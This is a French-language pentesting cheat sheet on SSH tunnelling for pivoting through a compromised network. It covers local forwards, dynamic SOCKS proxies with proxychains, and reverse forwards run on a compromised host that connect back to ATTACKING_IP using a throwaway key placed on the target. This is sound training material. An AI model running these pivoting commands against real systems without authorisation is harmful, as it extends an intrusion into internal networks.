# Forward Connections (Connexions de transfert)

La création d'un tunnel SSH direct (ou «local») peut être effectuée à partir de notre boîte d'attaque lorsque nous avons un accès SSH à la cible.

Il existe deux manières de créer un tunnel SSH de transfert: 
- La redirection de port 
- Création d'un proxy

### Local Port Forward (La redirection de port)

> Par exemple, si nous avions un accès SSH à 172.16.0.5 et qu'un serveur Web s'exécute sur 172.16.0.10, nous pourrions utiliser cette commande pour créer un lien vers le serveur sur 172.16.0.10

Sur kali :

```sh
ssh -L [bind_address:]port:host:hostport [username@address] -fN
```

```sh
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

### Remote Port Forward (La redirection de port distant)
> Reverse Connections ( Connexions inversées)


**Les connexions inversées sont tout à fait possibles avec le client SSH (et peuvent même être préférables si vous avez un shell sur le serveur compromis, mais pas d'accès SSH).**

Avant de pouvoir établir une connexion inversée en toute sécurité, nous devons suivre quelques étapes:

1. Tout d'abord, générez un nouvel ensemble de clés SSH et stockez-les dans un endroit sûr:

```
ssh-keygen
```

2. Copiez le contenu de la clé publique `id_rsa.pub`
3. Puis éditez le fichier `~/.ssh/authorized_keys` sur votre propre machine attaquante. (cree le si il n'existe pas)
4. Sur une nouvelle ligne, tapez la ligne suivante, puis collez la clé publique:

```c
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty {[Contenu de la cle id_rsa.pub]}
```

Cela garantit que la clé ne peut être utilisée que pour la redirection de port, empêchant la possibilité d'obtenir un shell sur votre machine attaquante.

5. Redemarrer le service SSH

```sh
sudo service ssh restart
```

6. Transférer la clé privée vers la box cible.C'est pourquoi nous avons généré un ensemble jetable de clés SSH à jeter dès que l'engagement est terminé.

7. Une fois la clé transférée, nous pouvons ensuite nous reconnecter avec une redirection de port inversée

```sh
ssh -R [kali-address:]port:host:hostport [kali@kali-address] -fN
```

```sh
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT kali@ATTACKING_IP -i KEYFILE -fN
```

> Par exemple, si nous avons un shell sur 172.16.0.5 et que nous voulons donner à notre boîtier d'attaque (172.16.0.20) l'accès au serveur Web sur 172.16.0.10, nous pourrions utiliser cette commande sur la machine 172.16.0.5 

```bash
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

Il est également possible de créer un reverse proxy inverse dans les clients qui le prennent en charge:  

```sh
ssh -R 1337 kali@ATTACKING_IP -i KEYFILE -fN
```

### Dynamic Port Forwarding (Proxy)

Ceci est utile lorsqu'il est combiné avec un outil tel que proxychains.

```sh
ssh -D [address to bind to]:[port to bind to] [user@address] -fN
```

```sh
ssh -D 1337 user@172.16.0.5 -fN
```

```sh
sudo nano /etc/proxychains.conf
	socks4 127.0.0.1 1337
```
